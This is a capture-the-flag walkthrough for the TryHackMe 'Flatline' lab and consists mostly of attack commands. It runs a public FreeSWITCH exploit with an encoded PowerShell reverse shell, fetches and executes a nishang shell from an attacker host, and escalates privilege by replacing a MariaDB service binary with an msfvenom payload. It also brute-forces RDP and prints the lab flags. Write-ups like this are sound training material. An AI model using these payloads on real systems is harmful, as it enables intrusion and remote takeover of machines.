# Flatline

{% embed url="https://tryhackme.com/room/flatline" %}
https://tryhackme.com/room/flatline
{% endembed %}

![](../../.gitbook/assets/Flatline.png)

## Task 1 Flags

#### What is the user.txt flag?

```bash
rustscan -a 10.10.118.67 -- -n -sVC
nmap -n -Pn -sVC -p3389,8021 10.10.118.67
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 19-12-05.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-04 19-13-06.png>)

```bash
searchsploit freeswitch
searchsploit -m 47799
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-50-05.png>)

```bash
python3 47799.txt 10.10.118.67 whoami
python3 47799.txt 10.10.118.67 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgAuADkALgAxADcANgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 19-52-28.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-04 19-40-10.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-04 19-43-32.png>)

```bash
nc -nvlp 4444
cat C:\Users\Nekrotic\Desktop\user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 20-01-36.png>)

{% hint style="success" %}
`THM{64bca0843d535fa73eecdc59d27cbe26}`
{% endhint %}

#### <mark style="color:red;">What is the root.txt flag?</mark>

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -P /var/www/html
python3 47799.txt 10.10.210.200 "powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.9.176/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.9.176 -Port 4444"
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 20-58-31.png>)

```bash
nc -nvlp 4444
PS > ls C:\projects
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-18-38.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-19-04.png>)

```bash
searchsploit openclinic
searchsploit -m 50448
cat 50448
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-20-19.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-41-15.png>)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.9.176 LPORT=4242 \
         -f exe > /var/www/html/mysqld_evil.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-30-31.png>)

```bash
PS > curl http://10.6.9.176/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
PS > cd C:\projects\openclinic\mariadb\bin
PS > mv mysqld.exe mysqld.bak
PS > mv mysqld_evil.exe mysqld.exe
PS > shutdown -r -f -t 0
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-28-48.png>)

```bash
msfconsole -q
msf > use exploit/multi/handler
msf > set payload windows/shell_reverse_tcp
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 21-22-15.png>)

```bash
whoami
type C:\Users\Nekrotic\Desktop\root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 22-03-26.png>)

{% hint style="success" %}
`THM{8c8bc5558f0f3f8060d00ca231a9fb5e}`
{% endhint %}

## Reference

{% embed url="https://musyokaian.medium.com/flatline-tryhackme-walkthrough-4d3fa85bcf9b" %}

{% embed url="https://jamarir.hashnode.dev/tryhackme-flatline" %}

{% embed url="https://www.cnblogs.com/yyxianren/p/14343333.html" %}

#### crowbar

```bash
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt 
crowbar -b rdp -u nekrotic -C rockyou_utf8.txt -s 10.10.118.67/32
```
